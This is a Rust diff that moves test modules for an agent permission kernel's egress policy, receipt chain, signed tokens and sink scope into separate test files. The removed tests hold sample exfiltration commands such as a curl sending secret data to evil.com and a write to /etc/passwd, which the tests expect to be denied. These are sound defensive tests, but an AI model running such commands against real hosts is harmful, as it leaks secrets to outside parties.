+++ crates/portcullis/src/kernel.rs
@@ -3634,199 +3634,7 @@ mod tests {
         );
     }
 
-    // ── Egress policy integration tests ────────────────────────────────
-
-    #[cfg(feature = "spec")]
-    mod egress_tests {
-        use super::*;
-        use crate::command::CommandLattice;
-        use crate::egress_policy::EgressPolicy;
-
-        /// Build a kernel that has all capabilities enabled and no command
-        /// restrictions — isolating just the egress policy check.
-        ///
-        /// Pre-grants approvals for all egress-capable operations so the
-        /// uninhabitable_state constraint doesn't interfere with egress policy tests.
-        fn kernel_with_egress(toml: &str) -> Kernel {
-            let policy = EgressPolicy::from_toml(toml).unwrap();
-            let mut perms = PermissionLattice::permissive();
-            perms.commands = CommandLattice::permissive();
-            let mut kernel = Kernel::new(perms);
-            kernel.set_egress_policy(policy);
-            // Pre-grant approvals so uninhabitable_state gating doesn't mask egress denials
-            kernel.grant_approval(Operation::RunBash, 100);
-            kernel.grant_approval(Operation::GitPush, 100);
-            kernel.grant_approval(Operation::CreatePr, 100);
-            kernel.grant_approval(Operation::WebFetch, 100);
-            kernel.grant_approval(Operation::WebSearch, 100);
-            kernel.grant_approval(Operation::SpawnAgent, 100);
-            kernel
-        }
-
-        #[test]
-        fn bash_curl_to_denied_host_is_blocked() {
-            let mut kernel = kernel_with_egress(r#"allowed_hosts = ["*.github.com", "crates.io"]"#);
-            let (d, token) = kernel.decide(
-                Operation::RunBash,
-                "curl https://evil.com/exfil?data=secret",
-            );
-            assert!(d.verdict.is_denied(), "expected deny, got {:?}", d.verdict);
-            assert!(token.is_none());
-            match &d.verdict {
-                Verdict::Deny(DenyReason::EgressBlocked {
-                    host,
-                    policy_reason,
-                }) => {
-                    assert_eq!(host, "evil.com");
-                    assert!(policy_reason.contains("evil.com"));
-                    assert!(policy_reason.contains("allowed hosts:"));
-                }
-                other => panic!("expected EgressBlocked, got {other:?}"),
-            }
-        }
-
-        #[test]
-        fn bash_curl_to_allowed_host_passes() {
-            let mut kernel = kernel_with_egress(r#"allowed_hosts = ["*.github.com", "crates.io"]"#);
-            let (d, token) = kernel.decide(Operation::RunBash, "curl https://api.github.com/repos");
-            assert!(
-                d.verdict.is_allowed(),
-                "expected allow, got {:?}",
-                d.verdict
-            );
-            assert!(token.is_some());
-        }
-
-        #[test]
-        fn bash_safe_command_no_egress_passes() {
-            let mut kernel = kernel_with_egress(r#"allowed_hosts = ["*.github.com"]"#);
-            let (d, _) = kernel.decide(Operation::RunBash, "cargo test --lib");
-            assert!(
-                d.verdict.is_allowed(),
-                "safe command should pass, got {:?}",
-                d.verdict
-            );
-        }
-
-        #[test]
-        fn web_fetch_denied_host() {
-            let mut kernel = kernel_with_egress(r#"allowed_hosts = ["*.github.com"]"#);
-            let (d, _) = kernel.decide(Operation::WebFetch, "https://evil.com/data");
-            assert!(d.verdict.is_denied());
-            match &d.verdict {
-                Verdict::Deny(DenyReason::EgressBlocked { host, .. }) => {
-                    assert_eq!(host, "evil.com");
-                }
-                other => panic!("expected EgressBlocked, got {other:?}"),
-            }
-        }
-
-        #[test]
-        fn web_fetch_allowed_host() {
-            let mut kernel = kernel_with_egress(r#"allowed_hosts = ["*.github.com"]"#);
-            let (d, token) = kernel.decide(Operation::WebFetch, "https://api.github.com/repos");
-            assert!(d.verdict.is_allowed());
-            assert!(token.is_some());
-        }
-
-        #[test]
-        fn git_push_denied_host() {
-            let mut kernel = kernel_with_egress(r#"allowed_hosts = ["github.com"]"#);
-            let (d, _) = kernel.decide(Operation::GitPush, "https://evil.com/org/repo.git");
-            assert!(d.verdict.is_denied());
-            match &d.verdict {
-                Verdict::Deny(DenyReason::EgressBlocked { host, .. }) => {
-                    assert_eq!(host, "evil.com");
-                }
-                other => panic!("expected EgressBlocked, got {other:?}"),
-            }
-        }
-
-        #[test]
-        fn git_push_allowed_host() {
-            let mut kernel = kernel_with_egress(r#"allowed_hosts = ["github.com"]"#);
-            let (d, token) = kernel.decide(Operation::GitPush, "https://github.com/org/repo.git");
-            assert!(d.verdict.is_allowed());
-            assert!(token.is_some());
-        }
-
-        #[test]
-        fn git_push_ssh_format_denied() {
-            let mut kernel = kernel_with_egress(r#"allowed_hosts = ["github.com"]"#);
-            let (d, _) = kernel.decide(Operation::GitPush, "git@evil.com:org/repo.git");
-            assert!(d.verdict.is_denied());
-            match &d.verdict {
-                Verdict::Deny(DenyReason::EgressBlocked { host, .. }) => {
-                    assert_eq!(host, "evil.com");
-                }
-                other => panic!("expected EgressBlocked, got {other:?}"),
-            }
-        }
-
-        #[test]
-        fn deny_list_overrides_wildcard_allow() {
-            let mut kernel = kernel_with_egress(
-                r#"
-allowed_hosts = ["*.github.com"]
-denied_hosts = ["evil.github.com"]
-"#,
-            );
-            // evil.github.com matches allow wildcard but deny takes priority
-            let (d, _) = kernel.decide(Operation::WebFetch, "https://evil.github.com/exfil");
-            assert!(d.verdict.is_denied());
-
-            // good.github.com is fine
-            let (d2, _) = kernel.decide(Operation::WebFetch, "https://good.github.com/data");
-            assert!(d2.verdict.is_allowed());
-        }
-
-        #[test]
-        fn no_egress_policy_allows_all() {
-            let mut perms = PermissionLattice::permissive();
-            perms.commands = CommandLattice::permissive();
-            let mut kernel = Kernel::new(perms);
-            kernel.grant_approval(Operation::WebFetch, 10);
-            // No egress policy set — should allow any host
-            let (d, _) = kernel.decide(Operation::WebFetch, "https://anything.com/data");
-            assert!(d.verdict.is_allowed());
-        }
-
-        #[test]
-        fn read_files_not_affected_by_egress() {
-            let mut kernel = kernel_with_egress(r#"allowed_hosts = []"#);
-            // Empty allowlist means all egress denied, but reads aren't egress
-            let (d, _) = kernel.decide(Operation::ReadFiles, "/workspace/main.rs");
-            assert!(d.verdict.is_allowed());
-        }
-
-        #[test]
-        fn bash_multiple_destinations_first_blocked() {
-            let mut kernel = kernel_with_egress(r#"allowed_hosts = ["b.com"]"#);
-            // Two destinations: a.com (blocked) then b.com (allowed)
-            let (d, _) =
-                kernel.decide(Operation::RunBash, "curl https://a.com; curl https://b.com");
-            assert!(
-                d.verdict.is_denied(),
-                "first blocked host should deny the whole command"
-            );
-            match &d.verdict {
-                Verdict::Deny(DenyReason::EgressBlocked { host, .. }) => {
-                    assert_eq!(host, "a.com");
-                }
-                other => panic!("expected EgressBlocked for a.com, got {other:?}"),
-            }
-        }
-
-        #[test]
-        fn egress_blocked_recorded_in_trace() {
-            let mut kernel = kernel_with_egress(r#"allowed_hosts = ["safe.com"]"#);
-            let trace_before = kernel.trace().len();
-            let _ = kernel.decide(Operation::WebFetch, "https://evil.com/data");
-            assert_eq!(kernel.trace().len(), trace_before + 1);
-            let entry = kernel.trace().last().unwrap();
-            assert!(entry.verdict.is_denied());
-        }
-    }
+    // ── Egress policy integration tests → tests/kernel_egress.rs (#825) ──
 
     // ── #654: Causal decide — flow graph supersedes flat label in decide() ──
 
@@ -4180,118 +3988,7 @@ denied_hosts = ["evil.github.com"]
         }
     }
 
-    // ═══════════════════════════════════════════════════════════════════
-    // Receipt chain integration tests
-    // ═══════════════════════════════════════════════════════════════════
-
-    mod receipt_chain_tests {
-        use super::*;
-        use crate::PermissionLattice;
-
-        #[test]
-        fn decide_produces_receipt_when_enabled() {
-            let perms = PermissionLattice::safe_pr_fixer();
-            let mut kernel = Kernel::new(perms);
-            kernel.enable_receipt_chain();
-
-            let (d, _token) = kernel.decide(Operation::ReadFiles, "/workspace/main.rs");
-            assert!(d.verdict.is_allowed());
-
-            let chain = kernel.receipt_chain().expect("chain should be enabled");
-            assert_eq!(chain.len(), 1);
-            assert!(chain.verify().is_ok());
-
-            let receipt = &chain.receipts()[0];
-            assert_eq!(receipt.operation, "ReadFiles");
-            assert_eq!(receipt.subject, "/workspace/main.rs");
-        }
-
-        #[test]
-        fn deny_produces_receipt() {
-            let perms = PermissionLattice::safe_pr_fixer();
-            let mut kernel = Kernel::new(perms);
-            kernel.enable_receipt_chain();
-
-            // safe_pr_fixer has git_push=Never
-            let (d, _token) = kernel.decide(Operation::GitPush, "origin/main");
-            assert!(d.verdict.is_denied());
-
-            let chain = kernel.receipt_chain().unwrap();
-            assert_eq!(chain.len(), 1);
-            assert!(chain.verify().is_ok());
-
-            let receipt = &chain.receipts()[0];
-            assert!(matches!(
-                receipt.verdict,
-                portcullis_core::flow::FlowVerdict::Deny(_)
-            ));
-        }
-
-        #[test]
-        fn chain_valid_after_multiple_decisions() {
-            let perms = PermissionLattice::safe_pr_fixer();
-            let mut kernel = Kernel::new(perms);
-            kernel.enable_receipt_chain();
-
-            // Mix of allows and denies
-            kernel.decide(Operation::ReadFiles, "/workspace/a.rs");
-            kernel.decide(Operation::WriteFiles, "/workspace/b.rs");
-            kernel.decide(Operation::GitPush, "origin/main"); // denied
-            kernel.decide(Operation::GlobSearch, "/workspace/**");
-            kernel.decide(Operation::ReadFiles, "/workspace/c.rs");
-
-            let chain = kernel.receipt_chain().unwrap();
-            assert_eq!(chain.len(), 5);
-            assert!(
-                chain.verify().is_ok(),
-                "chain should verify after 5 decisions"
-            );
-
-            // Head hash should not be zeros
-            assert_ne!(chain.head_hash(), &[0u8; 32]);
-        }
-
-        #[test]
-        fn receipt_chain_disabled_by_default() {
-            let perms = PermissionLattice::safe_pr_fixer();
-            let mut kernel = Kernel::new(perms);
-
-            kernel.decide(Operation::ReadFiles, "/workspace/main.rs");
-
-            assert!(
-                kernel.receipt_chain().is_none(),
-                "chain should be None when not enabled"
-            );
-        }
-
-        #[test]
-        fn receipt_links_are_contiguous() {
-            let perms = PermissionLattice::safe_pr_fixer();
-            let mut kernel = Kernel::new(perms);
-            kernel.enable_receipt_chain();
-
-            kernel.decide(Operation::ReadFiles, "/a");
-            kernel.decide(Operation::ReadFiles, "/b");
-            kernel.decide(Operation::ReadFiles, "/c");
-
-            let chain = kernel.receipt_chain().unwrap();
-            let receipts = chain.receipts();
-
-            // First receipt links to genesis (all zeros)
-            assert_eq!(receipts[0].prev_hash, [0u8; 32]);
-
-            // Each subsequent receipt's prev_hash == predecessor's receipt_hash
-            for i in 1..receipts.len() {
-                assert_eq!(
-                    receipts[i].prev_hash,
-                    receipts[i - 1].receipt_hash,
-                    "receipt {} should link to receipt {}",
-                    i,
-                    i - 1
-                );
-            }
-        }
-    }
+    // ── Receipt chain integration tests → tests/kernel_receipt.rs (#825) ──
 
     // ── Enterprise allowlist enforcement (#734) ─────────────────────
 
@@ -4357,212 +4054,7 @@ denied_hosts = ["evil.github.com"]
         assert!(token.is_some());
     }
 
-    // ── Kernel token verification tests (#783) ─────────────────────────
-    //
-    // These tests verify that the kernel enforces Ed25519 signature
-    // verification on declassification tokens when trusted keys are
-    // configured, and falls back to unsigned for backward compatibility.
-
-    #[cfg(feature = "crypto")]
-    mod kernel_token_verification_tests {
-        use super::*;
-        use portcullis_core::declassify::{
-            DeclassificationRule, DeclassificationToken, DeclassifyAction, TokenApplyResult,
-        };
-        use portcullis_core::flow::NodeKind;
-        use portcullis_core::IntegLevel;
-        use ring::rand::SystemRandom;
-        use ring::signature::{Ed25519KeyPair, KeyPair};
-
-        fn test_key() -> Ed25519KeyPair {
-            let rng = SystemRandom::new();
-            let pkcs8 = Ed25519KeyPair::generate_pkcs8(&rng).unwrap();
-            Ed25519KeyPair::from_pkcs8(pkcs8.as_ref()).unwrap()
-        }
-
-        fn public_key_bytes(key: &Ed25519KeyPair) -> [u8; 32] {
-            let pk = key.public_key().as_ref();
-            let mut bytes = [0u8; 32];
-            bytes.copy_from_slice(pk);
-            bytes
-        }
-
-        fn make_kernel_with_graph() -> Kernel {
-            let perms = PermissionLattice::safe_pr_fixer();
-            let mut kernel = Kernel::new(perms);
-            kernel.enable_flow_graph();
-            kernel
-        }
-
-        fn make_token(node_id: u64) -> DeclassificationToken {
-            DeclassificationToken::new(
-                node_id,
-                DeclassificationRule {
-                    action: DeclassifyAction::RaiseIntegrity {
-                        from: IntegLevel::Adversarial,
-                        to: IntegLevel::Untrusted,
-                    },
-                    justification: "Validated search results",
-                },
-                vec![Operation::WriteFiles],
-                u64::MAX,
-                "Curated API output".to_string(),
-            )
-        }
-
-        #[test]
-        fn verified_token_applied_with_trusted_keys() {
-            let key = test_key();
-            let mut kernel = make_kernel_with_graph();
-            kernel.set_trusted_keys(vec![public_key_bytes(&key)]);
-
-            // Observe web content to get a node
-            let node_id = kernel.observe(NodeKind::WebContent, &[]).unwrap();
-
-            // Sign a token targeting that node
-            let mut token = make_token(node_id);
-            crate::token_sign::sign_token(&mut token, &key);
-            assert!(token.is_signed());
-
-            // Apply via kernel — should succeed
-            let result = kernel.apply_declassification_token(&token);
-            match result {
-                Ok(TokenApplyResult::Applied {
-                    original_label,
-                    new_label,
-                }) => {
-                    assert_eq!(
-                        original_label.integrity,
-                        IntegLevel::Adversarial,
-                        "original should be Adversarial"
-                    );
-                    assert_eq!(
-                        new_label.integrity,
-                        IntegLevel::Untrusted,
-                        "new should be Untrusted after declassification"
-                    );
-                }
-                other => panic!("expected Applied with label change, got {:?}", other),
-            }
-        }
-
-        #[test]
-        fn unsigned_token_rejected_when_keys_set() {
-            let key = test_key();
-            let mut kernel = make_kernel_with_graph();
-            kernel.set_trusted_keys(vec![public_key_bytes(&key)]);
-
-            let node_id = kernel.observe(NodeKind::WebContent, &[]).unwrap();
-
-            // Create unsigned token (no signature)
-            let token = make_token(node_id);
-            assert!(!token.is_signed());
-
-            // Apply via kernel — should be rejected
-            let result = kernel.apply_declassification_token(&token);
-            match result {
-                Err(DenyReason::InvalidDeclassification { detail }) => {
-                    assert!(
-                        detail.contains("signature verification failed"),
-                        "expected signature failure detail, got: {detail}"
-                    );
-                }
-                other => panic!("expected InvalidDeclassification error, got {:?}", other),
-            }
-        }
-
-        #[test]
-        fn wrong_key_token_rejected() {
-            let sign_key = test_key();
-            let wrong_key = test_key();
-            let mut kernel = make_kernel_with_graph();
-            // Set wrong key as trusted
-            kernel.set_trusted_keys(vec![public_key_bytes(&wrong_key)]);
-
-            let node_id = kernel.observe(NodeKind::WebContent, &[]).unwrap();
-
-            // Sign with a different key
-            let mut token = make_token(node_id);
-            crate::token_sign::sign_token(&mut token, &sign_key);
-
-            let result = kernel.apply_declassification_token(&token);
-            match result {
-                Err(DenyReason::InvalidDeclassification { detail }) => {
-                    assert!(
-                        detail.contains("signature verification failed"),
-                        "expected signature failure detail, got: {detail}"
-                    );
-                }
-                other => panic!("expected InvalidDeclassification error, got {:?}", other),
-            }
-        }
-
-        #[test]
-        fn backward_compat_no_keys_allows_unsigned() {
-            // No trusted keys configured — unsigned tokens should work
-            let mut kernel = make_kernel_with_graph();
-
-            let node_id = kernel.observe(NodeKind::WebContent, &[]).unwrap();
-
-            let token = make_token(node_id);
-            assert!(!token.is_signed());
-
-            // Apply without keys — backward compatible, should succeed
-            let result = kernel.apply_declassification_token(&token);
-            match result {
-                Ok(TokenApplyResult::Applied { .. }) => {} // expected
-                other => panic!("expected Applied (backward compat), got {:?}", other),
-            }
-        }
-
-        #[test]
-        fn key_rotation_accepts_old_key() {
-            let old_key = test_key();
-            let new_key = test_key();
-            let mut kernel = make_kernel_with_graph();
-            // Both old and new keys are trusted
-            kernel.set_trusted_keys(vec![public_key_bytes(&new_key), public_key_bytes(&old_key)]);
-
-            let node_id = kernel.observe(NodeKind::WebContent, &[]).unwrap();
-
-            // Sign with old key
-            let mut token = make_token(node_id);
-            crate::token_sign::sign_token(&mut token, &old_key);
-
-            let result = kernel.apply_declassification_token(&token);
-            assert!(
-                matches!(result, Ok(TokenApplyResult::Applied { .. })),
-                "old key should still be accepted during rotation, got {:?}",
-                result
-            );
-        }
-
-        #[test]
-        fn apply_token_without_flow_graph_returns_error() {
-            let key = test_key();
-            let perms = PermissionLattice::safe_pr_fixer();
-            let mut kernel = Kernel::new(perms);
-            // Do NOT enable flow graph
-            kernel.set_trusted_keys(vec![public_key_bytes(&key)]);
-
-            let mut token = make_token(42);
-            crate::token_sign::sign_token(&mut token, &key);
-
-            let result = kernel.apply_declassification_token(&token);
-            match result {
-                Err(DenyReason::InvalidDeclassification { detail }) => {
-                    assert!(
-                        detail.contains("flow graph not enabled"),
-                        "expected flow graph error, got: {detail}"
-                    );
-                }
-                other => panic!(
-                    "expected InvalidDeclassification (flow graph), got {:?}",
-                    other
-                ),
-            }
-        }
-    }
+    // ── Kernel token verification tests → tests/kernel_token.rs (#825) ──
 
     // ── Delegation constraint enforcement (#779) ───────────────
 
@@ -4786,274 +4278,7 @@ denied_hosts = ["evil.github.com"]
         }
     }
 
-    // ═══════════════════════════════════════════════════════════════════
-    // Sink scope enforcement tests (#809)
-    // ═══════════════════════════════════════════════════════════════════
-
-    mod sink_scope_tests {
-        use super::*;
-        use crate::certificate::{SinkScope, VerifiedPermissions};
-        use crate::{BudgetLattice, CapabilityLattice, Obligations};
-
-        /// Build a fully permissive lattice with NO obligations and NO
-        /// uninhabitable constraint — purely for testing sink scope checks
-        /// without RequiresApproval noise.
-        fn permissive_no_obligations() -> PermissionLattice {
-            PermissionLattice {
-                capabilities: CapabilityLattice::permissive(),
-                obligations: Obligations::default(),
-                budget: BudgetLattice {
-                    max_cost_usd: rust_decimal::Decimal::from(100),
-                    ..Default::default()
-                },
-                ..PermissionLattice::permissive().as_ceiling()
-            }
-        }
-
-        /// Helper: create a VerifiedPermissions with the given SinkScope.
-        fn verified_with_scope(scope: SinkScope) -> VerifiedPermissions {
-            VerifiedPermissions {
-                effective: permissive_no_obligations(),
-                chain_depth: 1,
-                root_identity: "root".to_string(),
-                leaf_identity: "leaf".to_string(),
-                sink_scope: scope,
-            }
-        }
-
-        #[test]
-        fn write_outside_allowed_paths_denied() {
-            let scope = SinkScope {
-                allowed_paths: vec!["/workspace/output/".to_string()],
-                allowed_hosts: vec![],
-                allowed_git_refs: vec![],
-            };
-            let verified = verified_with_scope(scope);
-            let mut kernel = Kernel::from_certificate(verified, [0u8; 32]);
-
-            // Write inside scope — allowed
-            let (d, token) = kernel.decide(Operation::WriteFiles, "/workspace/output/result.txt");
-            assert!(
-                d.verdict.is_allowed(),
-                "write inside scope should be allowed"
-            );
-            assert!(token.is_some());
-
-            // Write outside scope — denied
-            let (d, token) = kernel.decide(Operation::WriteFiles, "/etc/passwd");
-            assert!(
-                d.verdict.is_denied(),
-                "write outside scope should be denied"
-            );
-            assert!(token.is_none());
-            match &d.verdict {
-                Verdict::Deny(DenyReason::SinkScopeDenied { dimension, detail }) => {
-                    assert_eq!(dimension, "path");
-                    assert!(detail.contains("/etc/passwd"), "detail: {detail}");
-                }
-                other => panic!("expected SinkScopeDenied, got {other:?}"),
-            }
-        }
-
-        #[test]
-        fn edit_outside_allowed_paths_denied() {
-            let scope = SinkScope {
-                allowed_paths: vec!["/workspace/src/**/*.rs".to_string()],
-                allowed_hosts: vec![],
-                allowed_git_refs: vec![],
-            };
-            let verified = verified_with_scope(scope);
-            let mut kernel = Kernel::from_certificate(verified, [0u8; 32]);
-
-            // Edit matching glob — allowed
-            let (d, _) = kernel.decide(Operation::EditFiles, "/workspace/src/lib.rs");
-            assert!(
-                d.verdict.is_allowed(),
-                "edit matching glob should be allowed"
-            );
-
-            // Edit not matching glob — denied
-            let (d, _) = kernel.decide(Operation::EditFiles, "/workspace/Cargo.toml");
-            assert!(d.verdict.is_denied(), "edit outside glob should be denied");
-            match &d.verdict {
-                Verdict::Deny(DenyReason::SinkScopeDenied { dimension, .. }) => {
-                    assert_eq!(dimension, "path");
-                }
-                other => panic!("expected SinkScopeDenied, got {other:?}"),
-            }
-        }
-
-        #[test]
-        fn network_outside_allowed_hosts_denied() {
-            let scope = SinkScope {
-                allowed_paths: vec![],
-                allowed_hosts: vec!["api.example.com".to_string()],
-                allowed_git_refs: vec![],
-            };
-            let verified = verified_with_scope(scope);
-            let mut kernel = Kernel::from_certificate(verified, [0u8; 32]);
-
-            // Fetch allowed host — allowed
-            let (d, _) = kernel.decide(Operation::WebFetch, "https://api.example.com/data");
-            assert!(d.verdict.is_allowed(), "fetch to allowed host should pass");
-
-            // Fetch disallowed host — denied
-            let (d, token) = kernel.decide(Operation::WebFetch, "https://evil.com/exfil");
-            assert!(
-                d.verdict.is_denied(),
-                "fetch to disallowed host should be denied"
-            );
-            assert!(token.is_none());
-            match &d.verdict {
-                Verdict::Deny(DenyReason::SinkScopeDenied { dimension, detail }) => {
-                    assert_eq!(dimension, "host");
-                    assert!(detail.contains("evil.com"), "detail: {detail}");
-                }
-                other => panic!("expected SinkScopeDenied, got {other:?}"),
-            }
-        }
-
-        #[test]
-        fn subdomain_of_allowed_host_permitted() {
-            let scope = SinkScope {
-                allowed_paths: vec![],
-                allowed_hosts: vec!["example.com".to_string()],
-                allowed_git_refs: vec![],
-            };
-            let verified = verified_with_scope(scope);
-            let mut kernel = Kernel::from_certificate(verified, [0u8; 32]);
-
-            let (d, _) = kernel.decide(Operation::WebFetch, "https://api.example.com/data");
-            assert!(
-                d.verdict.is_allowed(),
-                "subdomain of allowed host should pass"
-            );
-        }
-
-        #[test]
-        fn git_ref_outside_allowed_refs_denied() {
-            let scope = SinkScope {
-                allowed_paths: vec![],
-                allowed_hosts: vec![],
-                allowed_git_refs: vec!["origin/feature-*".to_string()],
-            };
-            let verified = verified_with_scope(scope);
-            let mut kernel = Kernel::from_certificate(verified, [0u8; 32]);
-
-            // Push to allowed ref — allowed
-            let (d, _) = kernel.decide(Operation::GitPush, "origin/feature-xyz");
-            assert!(
-                d.verdict.is_allowed(),
-                "push to allowed ref should pass, got: {:?}",
-                d.verdict
-            );
-
-            // Push to disallowed ref — denied
-            let (d, token) = kernel.decide(Operation::GitPush, "origin/main");
-            assert!(
-                d.verdict.is_denied(),
-                "push to disallowed ref should be denied"
-            );
-            assert!(token.is_none());
-            match &d.verdict {
-                Verdict::Deny(DenyReason::SinkScopeDenied { dimension, detail }) => {
-                    assert_eq!(dimension, "git_ref");
-                    assert!(detail.contains("origin/main"), "detail: {detail}");
-                }
-                other => panic!("expected SinkScopeDenied, got {other:?}"),
-            }
-        }
-
-        #[test]
-        fn no_scope_means_unrestricted() {
-            // Unrestricted scope (all empty) = None stored on kernel
-            let scope = SinkScope::unrestricted();
-            let verified = verified_with_scope(scope);
-            let kernel = Kernel::from_certificate(verified, [0u8; 32]);
-
-            assert!(
-                kernel.sink_scope().is_none(),
-                "unrestricted scope should be None"
-            );
-
-            // Each operation tested in its own kernel to avoid IFC taint accumulation
-            let scope = SinkScope::unrestricted();
-            let mut k1 = Kernel::from_certificate(verified_with_scope(scope.clone()), [0u8; 32]);
-            let (d, _) = k1.decide(Operation::WriteFiles, "/anywhere/file.txt");
-            assert!(d.verdict.is_allowed(), "write should pass without scope");
-
-            let mut k2 =
-                Kernel::from_certificate(verified_with_scope(SinkScope::unrestricted()), [0u8; 32]);
-            let (d, _) = k2.decide(Operation::WebFetch, "https://any-host.com/");
-            assert!(d.verdict.is_allowed(), "fetch should pass without scope");
-
-            let mut k3 =
-                Kernel::from_certificate(verified_with_scope(SinkScope::unrestricted()), [0u8; 32]);
-            let (d, _) = k3.decide(Operation::GitPush, "origin/main");
-            assert!(d.verdict.is_allowed(), "push should pass without scope");
-        }
-
-        #[test]
-        fn read_operations_unaffected_by_path_scope() {
-            // Path scope should only gate write operations, not reads
-            let scope = SinkScope {
-                allowed_paths: vec!["/workspace/output/".to_string()],
-                allowed_hosts: vec![],
-                allowed_git_refs: vec![],
-            };
-            let verified = verified_with_scope(scope);
-            let mut kernel = Kernel::from_certificate(verified, [0u8; 32]);
-
-            // ReadFiles outside scope — should still be allowed
-            let (d, _) = kernel.decide(Operation::ReadFiles, "/etc/hosts");
-            assert!(
-                d.verdict.is_allowed(),
-                "read operations should not be gated by sink scope"
-            );
-        }
-
-        #[test]
-        fn sink_scope_accessor_returns_scope() {
-            let scope = SinkScope {
-                allowed_paths: vec!["/out/".to_string()],
-                allowed_hosts: vec!["host.com".to_string()],
-                allowed_git_refs: vec![],
-            };
-            let verified = verified_with_scope(scope);
-            let kernel = Kernel::from_certificate(verified, [0u8; 32]);
-
-            let s = kernel.sink_scope().expect("scope should be Some");
-            assert_eq!(s.allowed_paths, vec!["/out/"]);
-            assert_eq!(s.allowed_hosts, vec!["host.com"]);
-            assert!(s.allowed_git_refs.is_empty());
-        }
-
-        #[test]
-        fn from_certificate_with_isolation_also_stores_scope() {
-            let scope = SinkScope {
-                allowed_paths: vec!["/restricted/".to_string()],
-                allowed_hosts: vec![],
-                allowed_git_refs: vec![],
-            };
-            let verified = verified_with_scope(scope);
-            let mut kernel = Kernel::from_certificate_with_isolation(
-                verified,
-                [0u8; 32],
-                IsolationLattice::localhost(),
-            );
-
-            assert!(kernel.sink_scope().is_some());
-
-            let (d, _) = kernel.decide(Operation::WriteFiles, "/other/file.txt");
-            assert!(d.verdict.is_denied());
-            match &d.verdict {
-                Verdict::Deny(DenyReason::SinkScopeDenied { dimension, .. }) => {
-                    assert_eq!(dimension, "path");
-                }
-                other => panic!("expected SinkScopeDenied, got {other:?}"),
-            }
-        }
-    }
+    // ── Sink scope enforcement tests → tests/kernel_sink_scope.rs (#825) ──
 
     // ═══════════════════════════════════════════════════════════════════
     // extract_host unit tests
